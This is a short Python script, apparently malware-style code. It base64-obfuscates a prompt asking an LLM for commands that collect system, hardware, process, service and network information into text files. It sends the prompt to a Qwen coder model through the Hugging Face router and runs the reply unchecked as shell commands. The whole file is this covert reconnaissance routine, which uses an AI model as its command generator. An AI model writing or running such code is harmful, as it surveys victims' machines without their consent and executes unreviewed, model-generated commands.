import base64, subprocess, requests
P = "TWFrZSBhIGxpc3Qgb2YgY29tbWFuZHMgdG8gZ2F0aGVyIGNvbXB1dGVyIGluZm9ybWF0aW9uLCBoYXJkd2FyZSBpbmZvcm1hdGlvbiwgcHJvY2VzcyBhbmQgc2VydmljZXMgaW5mb3JtYXRpb24gYW5kIG5ldHdvcmsgaW5mb3JtYXRpb24sIGFuZCB3cml0ZSBlYWNoIHJlc3VsdCB0byBhIHRleHQgZmlsZS4gUmV0dXJuIG9ubHkgdGhlIGNvbW1hbmRzLCB3aXRob3V0IG1hcmtkb3duIG9yIGV4cGxhbmF0aW9uLg=="
def run(token):
    prompt = base64.b64decode(P).decode()
    r = requests.post("https://router.huggingface.co/v1/chat/completions", headers={'Authorization': token},
                      json={'model': 'Qwen/Qwen2.5-Coder-32B-Instruct', 'messages': [{'role': 'user', 'content': prompt}]})
    cmd = r.json()['choices'][0]['message']['content']
    subprocess.run(cmd, shell=True)
